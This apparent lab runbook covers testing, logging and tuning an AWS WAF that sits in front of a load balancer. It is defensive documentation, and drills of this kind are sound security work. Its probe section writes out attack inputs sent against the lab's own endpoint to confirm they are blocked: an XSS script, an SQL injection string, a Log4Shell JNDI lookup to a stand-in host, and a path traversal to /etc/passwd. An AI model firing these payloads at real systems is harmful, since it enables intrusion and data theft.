# WAF: attack drills and log analysis

AWS WAF sits in front of the app's ALB (`terraform/envs/lab/platform-k8s/waf.tf`), so it runs before Cognito sign-in and before the app. Rules, in order (the first one that blocks wins):

| Priority | Rule | Action | Stops |
|---|---|---|---|
| 0 | `rate-limit-per-ip` | block | more than `waf_rate_limit` requests per IP per 60 s (default 300) |
| 10 | `geo-allowlist` | **count** (or block) | countries outside `waf_allowed_countries` (default `ZA`); adds label `geo:out-of-market` |
| 20 | Amazon IP reputation | block | botnets, scanners, known-bad IPs |
| 30 | Known bad inputs | block | Log4Shell (`${jndi:...}`), ... |
| 40 | SQL injection | block | `' OR '1'='1`, ... |
| 50 | Core rule set | block | XSS, path traversal, missing User-Agent, oversized parts |

Check it's attached:

```bash
export AWS_PROFILE=sunshine AWS_REGION=eu-west-1
LB=$(aws elbv2 describe-load-balancers --query "LoadBalancers[?starts_with(LoadBalancerName,'k8s-sunshine-')].LoadBalancerArn | [0]" --output text)
aws wafv2 get-web-acl-for-resource --resource-arn "$LB" --query 'WebACL.[Name,Rules[].Name]'
```

## 1. Attack probes (expected 403 from WAF, the app never sees them)

All against the public `/healthz`, so no sign-in is needed:

```bash
U=https://eks.simptechit.click/healthz
code() { curl -s -o /dev/null -w '%{http_code}  ' "$@"; }

code "$U";                                                         echo "normal request (200)"
code -G "$U" --data-urlencode 'q=<script>alert(1)</script>';     echo "XSS            -> core rule set"
code -G "$U" --data-urlencode "id=1' OR '1'='1";                   echo "SQL injection  -> SQLi rule set"
code -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' "$U";      echo "Log4Shell      -> known bad inputs"
code -G "$U" --data-urlencode 'file=../../../../etc/passwd';       echo "path traversal -> core rule set"
code -A '' "$U";                                                   echo "no User-Agent  -> core rule set"
```

A blocked request gets a plain 403 from WAF (body `403 Forbidden`), not JSON from the app.

## 2. Rate limit (flood from one IP)

```bash
hey -z 90s -c 10 https://eks.simptechit.click/healthz | sed -n '/Status code distribution/,$p'
```

Expect `[200]` first, then `[403]` once WAF's counter passes 300 in 60 s. WAF checks rates about every 10 s, so the switch takes a few seconds. While it lasts, you're blocked in the browser too; it lifts by itself within about a minute after you stop.

Lesson: one office NAT IP can look like an attacker. Size the limit for your users, or key it on something other than IP. A load test from one machine must raise it first: `-var waf_rate_limit=100000`.

## 3. Logs: what did WAF do, and why

Everything goes to CloudWatch Logs `aws-waf-logs-sunshine-lab` (Cookie and Authorization headers redacted). Logs Insights queries:

**Blocked, by rule:**
```
fields @timestamp, terminatingRuleId, httpRequest.clientIp, httpRequest.country, httpRequest.uri, httpRequest.args
| filter action = "BLOCK"
| sort @timestamp desc
| limit 50
```

**Traffic by country:**
```
stats count() as requests by httpRequest.country
| sort requests desc
```

**Out-of-market traffic the geo rule matched (count mode lets it through):**
```
filter @message like /geo:out-of-market/
| stats count() as requests by httpRequest.country, action
```

**What a count rule matched (non-terminating):**
```
fields @timestamp, action, httpRequest.country, httpRequest.uri, nonTerminatingMatchingRules.0.ruleId as counted_by
| filter ispresent(nonTerminatingMatchingRules.0.ruleId)
| sort @timestamp desc
```

## 4. Count vs block: the geo drill

The geo rule ships in **count** mode. Out-of-market requests are logged and labelled but still allowed (`action = ALLOW`, the rule shows up under `nonTerminatingMatchingRules`). GitHub's runners are in the US, so the post-deploy smoke test shows up here on every lab-up.

To see blocking, lock yourself out on purpose: allow only Ireland, in block mode. Apply platform-k8s locally:

```bash
cd terraform/envs/lab/platform-k8s
export TF_VAR_state_bucket=sunshine-tfstate-033147048268
terraform init -backend-config="bucket=$TF_VAR_state_bucket"
terraform apply -var 'waf_geo_action=block' -var 'waf_allowed_countries=["IE"]'
curl -s -o /dev/null -w '%{http_code}\n' https://eks.simptechit.click/healthz    # 403 - you are in ZA
terraform apply                                                                    # back to defaults
```

Lessons for production:
- **A count rule blocks nothing.** Read the logs, then switch to block. Don't leave it in count and assume it protects you.
- Uptime checks and CI runners outside the allowed countries get blocked too. Allowlist them, or exempt the health paths with a scope-down.
- WAFv2 can't attach to an NLB. Anything behind an NLB needs another layer: CloudFront plus WAF, Shield, or security groups.

## 5. If something breaks

| Symptom | Look at |
|---|---|
| A real user gets 403 | Run the "Blocked, by rule" query and take `terminatingRuleId`. If it's a false positive, override that single managed rule to count (`rule_action_override`). Don't disable the whole group. |
| Signed-in users get 403 after a while | Core rule set size limits: the ALB session cookie (`AWSELBAuthSessionCookie-*`) can be large. Check whether the rule is `SizeRestrictions_*`. |
| Smoke test "WAF did not block the XSS probe (200)" | Web ACL not attached (LB controller events: `kubectl -n sunshine describe ingress sunshine-app`), or `enable_waf = false`. |
| `terraform destroy` "WAFAssociatedItemException" | The ALB still uses the ACL. lab-down deletes the Ingresses (and so the ALB) first. Run it, or delete the Ingress by hand. |

## Interview notes

- **Layering:** WAF (L7 filtering, rate limits, geo) → ALB auth (Cognito) → NetworkPolicy (only LB subnets reach pods) → app authorisation (groups). Each layer assumes the one before can fail.
- **Rollout:** new rules go in count mode, then get tuned with logs, then switched to block, one sub-rule at a time (`rule_action_override`).
- **Managed rule groups** are versioned and updated by AWS. You pay $1/month per rule group, and WCU capacity is budgeted: about 1,130 here, of the 1,500 included in the base price.
- **Logs** redact the `cookie` and `authorization` headers, because a session cookie is a credential.
- **Cost:** about $5/month for the web ACL, plus about $1/month per rule (6 here), plus $0.60 per million requests, prorated hourly. A few cents per lab session.
